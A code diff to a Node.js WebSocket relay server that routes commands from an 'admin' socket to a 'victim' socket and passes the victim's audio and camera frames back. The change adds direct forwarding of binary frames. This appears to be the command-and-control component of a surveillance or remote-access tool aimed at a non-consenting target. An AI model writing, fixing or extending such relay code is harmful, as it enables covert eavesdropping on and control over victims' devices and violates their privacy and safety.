@@ -43,18 +43,33 @@ wss.on('connection', (ws, req) => {
         console.log('>>> Admin connected successfully.');
     }
 
-    ws.on('message', (message) => {
-        const isBinary = Buffer.isBuffer(message);
-        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
-        
-        // Avoid spamming logs with continuous audio/camera frame chunks
-        if (!logContent.startsWith('AUDIO_FRAME:') && !logContent.startsWith('CAMERA_FRAME:')) {
-            console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
+    ws.on('message', (message, isBinary) => {
+    // Check if the message is text or binary safely using ws library's second parameter (isBinary)
+    // or fallback to Buffer.isBuffer(message)
+    const binaryFlag = typeof isBinary !== 'undefined' ? isBinary : Buffer.isBuffer(message);
+
+    if (binaryFlag) {
+        // Route binary frames directly without string conversion
+        if (role === 'admin') {
+            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
+                victimSocket.send(message, { binary: true });
+            }
+        } else if (role === 'victim') {
+            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+                adminSocket.send(message, { binary: true });
+            }
+        }
+    } else {
+        // Handle text payloads (JSON, commands, or text-prefixed frames like AUDIO_FRAME:)
+        const textMessage = message.toString();
+
+        if (!textMessage.startsWith('AUDIO_FRAME:') && !textMessage.startsWith('CAMERA_FRAME:')) {
+            console.log(`Received text from [${role}]: ${textMessage.substring(0, 100)}...`);
         }
 
         if (role === 'admin') {
             if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-                victimSocket.send(message);
+                victimSocket.send(textMessage);
             } else {
                 console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                 if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
@@ -63,10 +78,11 @@ wss.on('connection', (ws, req) => {
             }
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-                adminSocket.send(message);
+                adminSocket.send(textMessage);
             }
         }
-    });
+    }
+});
 
     ws.on('close', () => {
         if (ws === victimSocket) {
